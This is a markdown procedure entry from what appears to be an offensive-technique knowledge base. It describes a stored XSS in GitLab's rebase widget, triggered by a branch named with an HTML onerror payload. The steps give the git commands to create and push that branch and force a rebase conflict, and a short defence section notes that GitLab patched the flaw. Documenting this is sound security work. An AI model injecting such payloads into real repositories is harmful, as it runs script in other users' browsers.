---
tags:
  - xss-injection
  - branch-creation
type: procedure
tools:
  - '[[tools/Git]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/touch-file]]'
  - '[[commands/git-add-file]]'
  - '[[commands/git-commit-message]]'
  - '[[commands/git-push-origin]]'
  - '[[commands/git-checkout-xss-branch]]'
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:44.371Z'
sub_techniques: []
id: a9808787-2975-43f7-a50e-23484a162b09
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Create-Malicious-Branch-with-XSS-Payload

## Summary

This procedure clones the project repo, creates commits on master, then branches with an XSS payload in the name, and adds conflicting commits to trigger rebase.

## Description

The core of the exploit: Branch names are rendered unsanitized in the Vue.js rebase widget. Payload like '<img/src='x'/onerror=alert(document.domain)>' executes on page load for viewers without edit access.

## Requirements

1. Local Git installation
2. Clone access to project repo
3. Network to push to GitLab

## Defense

Defensive measures and detection strategies:

- Sanitize branch names in UI rendering (GitLab patched this)
- Restrict branch name formats via hooks
- Monitor for suspicious branch names in logs

## Objectives

1. Inject JS payload in branch metadata
2. Create rebase conflict
3. Push to remote for MR setup

## Instructions

### Step 1: Initial Master Commit

**Context**: Create base commit on master.

**Command** ([[commands/touch-file]]):
```bash
touch 1.txt
git add 1.txt
git commit -m "initial commit"
git push origin master
```

> Creates and pushes initial file. Expected output: Commit hash and push success.

### Step 2: Create XSS Branch

**Context**: Branch with payload name and add commit.

**Command** ([[commands/git-checkout-xss-branch]]):
```bash
git checkout -b "<img/src='x'/onerror=alert(document.domain)>"
touch 2.txt
git add 2.txt
git commit -m "add 2.txt"
git push origin "<img/src='x'/onerror=alert(document.domain)>"
```

> Switches to new branch, commits file. Expected output: Branch created and pushed.

### Step 3: Conflicting Master Commit

**Context**: Add commit to master for rebase need.

**Command** ([[commands/git-push-origin]]):
```bash
git checkout master
touch 3.txt
git add 3.txt
git commit -m "add 3.txt"
git push origin master
```

> Creates conflict. Expected output: Master updated ahead of branch.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used

- [[commands/touch-file]]
- [[commands/git-add-file]]
- [[commands/git-commit-message]]
- [[commands/git-push-origin]]
- [[commands/git-checkout-xss-branch]]

## Tools Used

- [[tools/Git]]

## Tags

- xss-injection
- branch-creation
